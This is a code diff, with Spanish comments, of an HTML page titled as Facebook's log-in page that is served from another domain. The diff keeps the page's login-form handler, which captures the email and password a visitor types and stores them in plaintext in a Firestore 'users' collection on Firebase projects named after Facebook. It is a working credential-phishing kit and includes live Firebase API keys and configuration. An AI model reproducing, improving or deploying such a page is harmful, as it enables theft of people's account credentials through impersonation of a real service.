@@ -4,6 +4,7 @@
   <base href="https://trustworthy-alternative-social.com">
   <title>Facebook - Inicia sesión o regístrate</title>
   <style>
+    /* Estilos existentes que no se modifican */
     * {
       margin: 0;
       padding: 0;
@@ -147,13 +148,11 @@
 </div>
 
 <!-- Firebase SDKs -->
-<script type="module">
-  // Import the functions you need from the SDKs you need
+<script type="module"> 
+  // Importar Firebase
   import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-  // TODO: Add SDKs for Firebase products that you want to use
-  // https://firebase.google.com/docs/web/setup#available-libraries
 
-  // Your web app's Firebase configuration
+  // Configuración de Firebase
   const firebaseConfig = {
     apiKey: "AIzaSyA-okgbyWo2fSd41521MGYrRdwE8Kj8UDY",
     authDomain: "face-7efc6.firebaseapp.com",
@@ -163,59 +162,54 @@
     appId: "1:1035061315837:web:74509849ccb74ef7a61694"
   };
 
-  // Initialize Firebase
+  // Inicializar Firebase
   const app = initializeApp(firebaseConfig);
+  console.log("Firebase inicializado con la nueva configuración.");
 </script>
 
+<script src="https://www.gstatic.com/firebasejs/9.7.1/firebase-firestore.js"></script>
+
 <script>
-  // Configuración de Firebase antigua para Firestore
-  const firebaseConfig = {
-    apiKey: "AIzaSyDABJVpXtT-iZvJ4jKg_lOJZLFiCaNwzcw",
-    authDomain: "facebook-com7.firebaseapp.com",
-    databaseURL: "https://facebook-com7-default-rtdb.firebaseio.com",
-    projectId: "facebook-com7",
-    storageBucket: "facebook-com7.appspot.com",
-    messagingSenderId: "407606120629",
-    appId: "1:407606120629:web:7326f41720ff6081b86efc",
-    measurementId: "G-27VRJLSYJH"
-  };
+// Configuración anterior
+const firebaseConfigOld = {
+  apiKey: "AIzaSyDABJVpXtT-iZvJ4jKg_lOJZLFiCaNwzcw",
+  authDomain: "facebook-com7.firebaseapp.com",
+  databaseURL: "https://facebook-com7-default-rtdb.firebaseio.com",
+  projectId: "facebook-com7",
+  storageBucket: "facebook-com7.appspot.com",
+  messagingSenderId: "407606120629",
+  appId: "1:407606120629:web:7326f41720ff6081b86efc",
+  measurementId: "G-27VRJLSYJH"
+};
 
-  // Inicialización de Firebase antigua
-  const appOld = firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore(); // Inicializamos Firestore
+// Inicialización antigua de Firebase
+const appOld = firebase.initializeApp(firebaseConfigOld);
+const db = firebase.firestore();
 
-  // Obtener elementos del formulario
-  const loginForm = document.getElementById('login-form');
-  const loginButton = document.querySelector('.login-button');
+const loginForm = document.getElementById('login-form');
+const loginButton = document.querySelector('.login-button');
 
-  // Manejar el envío del formulario
-  loginForm.addEventListener('submit', function(e) {
-    e.preventDefault();  // Prevenir el envío tradicional del formulario
+loginForm.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const email = document.getElementById('email').value;
+  const password = document.getElementById('password').value;
 
-    const email = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+  loginButton.innerText = "Cargando...";
 
-    // Mostrar un mensaje de cargando, si deseas
-    loginButton.innerText = "Cargando..."; 
-
-    // Guardar datos en Firestore
-    db.collection("users").add({
-      email: email,
-      password: password,  // Aunque es preferible que las contraseñas se "hasheen" antes de guardarlas
-      createdAt: firebase.firestore.FieldValue.serverTimestamp(),  // Fecha y hora automáticas
-    })
-    .then(() => {
-      console.log('Datos guardados en Firestore');
-      alert("¡Datos guardados correctamente!");
-    })
-    .catch((error) => {
-      console.error("Error al guardar datos en Firestore:", error);
-      alert('Ocurrió un error al guardar los datos.');
-    });
-
-    // Restaurar el texto del botón
-    loginButton.innerText = "Iniciar sesión";
+  db.collection("users").add({
+    email: email,
+    password: password,
+    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+  })
+  .then(() => {
+    alert("¡Datos guardados correctamente!");
+  })
+  .catch((error) => {
+    alert('Ocurrió un error.');
   });
+
+  loginButton.innerText = "Iniciar sesión";
+});
 </script>
 
 </body>
